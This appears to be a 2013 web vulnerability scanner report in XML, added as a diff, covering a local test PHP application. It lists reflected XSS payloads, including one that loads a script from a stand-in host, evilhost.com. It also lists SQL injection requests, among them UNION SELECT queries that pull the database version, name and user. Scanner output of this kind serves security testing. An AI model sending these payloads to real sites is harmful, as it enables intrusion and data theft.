@@ -1,0 +1,135 @@
+<?xml version="1.0" encoding="utf-8"?>
+<report>
+  <date>June 17, 2013, 10:44 am</date>
+  <resource>
+    <addrdata>
+      <urladdr>http://localhost/testapps/vulnerable_app.php?id=1</urladdr>
+      <ipaddr>127.0.0.1</ipaddr>
+    </addrdata>
+    <serverbanner>Apache/2.4.3 (Win32) PHP/5.4.12</serverbanner>
+  </resource>
+  <securitylevel>1</securitylevel>
+  <testedvulnerabilities>
+    <vulnerability security_level="1">XSS</vulnerability>
+    <vulnerability security_level="1">SQL Injection</vulnerability>
+  </testedvulnerabilities>
+  <scandetails>
+    <xsstestdetails>
+      <subjects>
+        <subject type="vulnerability">Unique Vector</subject>
+        <subject type="exploit">Numeric Code</subject>
+        <subject type="exploit">Remote Code</subject>
+        <subject type="exploit">Data Protocol</subject>
+        <subject type="exploit">Hands-Free</subject>
+      </subjects>
+      <vulnerableparams>
+        <vulnerableforms>
+          <form form_id="0">
+            <vulnerableparam>
+              <paramname>username</paramname>
+              <xsstype>reflected</xsstype>
+              <vulnerablevalues>
+                <checktechnique technique_name="Unique Vector">
+                  <value>'';!--&amp;quot;&amp;lt;XSS&amp;gt;={()}</value>
+                  <value>&amp;lt;XSS&amp;gt;&amp;lt;/XSS&amp;gt;</value>
+                  <value>xss&amp;gt;&amp;lt;/xss</value>
+                </checktechnique>
+              </vulnerablevalues>
+              <exploits>
+                <exploittechnique technique_name="Numeric Code">
+                  <exploitkind>
+                    <valuesqueue>&amp;lt;&amp;gt;().,/</valuesqueue>
+                    <exploitdata>Possibly can insert a code that converted to the numeric form. Example: &amp;lt;script&amp;gt;eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41,59))&amp;lt;/script&amp;gt;</exploitdata>
+                  </exploitkind>
+                </exploittechnique>
+                <exploittechnique technique_name="Remote Code">
+                  <exploitkind>
+                    <valuesqueue>&amp;lt;&amp;gt;:/.=</valuesqueue>
+                    <exploitdata>Possibly can insert the &amp;lt;script&amp;gt; tag with source attribute that will contains an URL to the evil script. Example: &amp;lt;script src=http://evilhost.com/evilscript.js&amp;gt;&amp;lt;/script&amp;gt;</exploitdata>
+                  </exploitkind>
+                </exploittechnique>
+                <exploittechnique technique_name="Data Protocol">
+                  <exploitkind>
+                    <valuesqueue>&amp;lt;&amp;gt;:;/,=</valuesqueue>
+                    <exploitdata>Possibly can insert a code wich encrypted to &amp;quot;base64&amp;quot;-form and that will works under &amp;quot;data&amp;quot; protocol. Code . Example: &amp;lt;script src=data:;base64,YWxlcnQoJ1hTUycpOw==&amp;gt;&amp;lt;/script&amp;gt;</exploitdata>
+                  </exploitkind>
+                </exploittechnique>
+                <exploittechnique technique_name="Hands-Free">
+                  <exploitkind>
+                    <valuesqueue>'';!--&amp;quot;&amp;lt;script&amp;gt;=&amp;lt;/script&amp;gt;{()}</valuesqueue>
+                    <exploitdata>Possibly can inject any javascript code (exculde the &amp;quot;&amp;amp;&amp;quot; symbol).</exploitdata>
+                  </exploitkind>
+                </exploittechnique>
+              </exploits>
+            </vulnerableparam>
+          </form>
+        </vulnerableforms>
+      </vulnerableparams>
+    </xsstestdetails>
+    <sqlinjtestdetails>
+      <possibledb>MySQL</possibledb>
+      <subjects>
+        <subject type="vulnerability">Magic Quotes</subject>
+        <subject type="vulnerability">Numerical Operations (Blind)</subject>
+        <subject type="vulnerability">Grouping Operations</subject>
+        <subject type="vulnerability">Boolean Operations (Blind)</subject>
+        <subject type="exploit">Column Count</subject>
+        <subject type="exploit">Base Info</subject>
+        <subject type="exploit">System DB Check</subject>
+      </subjects>
+      <vulnerableparams>
+        <vulnerableparam>
+          <paramname>id</paramname>
+          <vulnerablerequests>
+            <checktechnique technique_name="Magic Quotes">
+              <request>http://localhost/testapps/vulnerable_app.php?id=1%27</request>
+              <request>http://localhost/testapps/vulnerable_app.php?id=1%22</request>
+              <request>http://localhost/testapps/vulnerable_app.php?id=1%2F%2A</request>
+              <request>http://localhost/testapps/vulnerable_app.php?id=1%27%2F%2A</request>
+              <request>http://localhost/testapps/vulnerable_app.php?id=1%27+--+</request>
+              <request>http://localhost/testapps/vulnerable_app.php?id=1%29%2F%2A</request>
+              <request>http://localhost/testapps/vulnerable_app.php?id=1%29+--</request>
+              <request>http://localhost/testapps/vulnerable_app.php?id=1%22%2F%2A</request>
+            </checktechnique>
+            <checktechnique technique_name="Numerical Operations (Blind)">
+              <request>http://localhost/testapps/vulnerable_app.php?id=2-1</request>
+              <request>http://localhost/testapps/vulnerable_app.php?id=0%2B1</request>
+            </checktechnique>
+            <checktechnique technique_name="Grouping Operations">
+              <request>http://localhost/testapps/vulnerable_app.php?id=1+GROUP+BY+1839</request>
+              <request>http://localhost/testapps/vulnerable_app.php?id=1+GROUP+BY+1839+--+</request>
+              <request>http://localhost/testapps/vulnerable_app.php?id=1+ORDER+BY+1839</request>
+              <request>http://localhost/testapps/vulnerable_app.php?id=1+ORDER+BY+1839+--+</request>
+            </checktechnique>
+            <checktechnique technique_name="Boolean Operations (Blind)">
+              <request>http://localhost/testapps/vulnerable_app.php?id=1+OR+1%3D2+OR+id%3D1</request>
+              <request>http://localhost/testapps/vulnerable_app.php?id=1+AND+1%3D1+AND+id%3D1</request>
+            </checktechnique>
+          </vulnerablerequests>
+          <exploits>
+            <exploittechnique technique_name="Column Count">
+              <exploitkind>
+                <resultqueue>http://localhost/testapps/vulnerable_app.php?id=1+ORDER+BY+2+--+</resultqueue>
+                <exploitdata>Table column count: 2</exploitdata>
+              </exploitkind>
+            </exploittechnique>
+            <exploittechnique technique_name="Base Info">
+              <exploitkind>
+                <resultqueue>http://localhost/testapps/vulnerable_app.php?id=-5551+UNION+SELECT+concat%280x2E2E696E732E696E736F6D6E69612E696E732E2E%2C%40%40version%2C0x2E2E696E732E696E736F6D6E69612E696E732E2E%2Cdatabase%28%29%2C0x2E2E696E732E696E736F6D6E69612E696E732E2E%2Cuser%28%29%2C0x2E2E696E732E696E736F6D6E69612E696E732E2E%29%2C1+--+</resultqueue>
+                <exploitdata>Base version: 5.5.29.
+Current Database: blizzardgames.
+Current User: root@localhost.</exploitdata>
+              </exploitkind>
+            </exploittechnique>
+            <exploittechnique technique_name="System DB Check">
+              <exploitkind>
+                <resultqueue>http://localhost/testapps/vulnerable_app.php?id=-5551+UNION+SELECT+table_name%2C1+FROM+INFORMATION_SCHEMA.TABLES+--+</resultqueue>
+                <exploitdata>The System Database is accessible.</exploitdata>
+              </exploitkind>
+            </exploittechnique>
+          </exploits>
+        </vulnerableparam>
+      </vulnerableparams>
+    </sqlinjtestdetails>
+  </scandetails>
+</report>
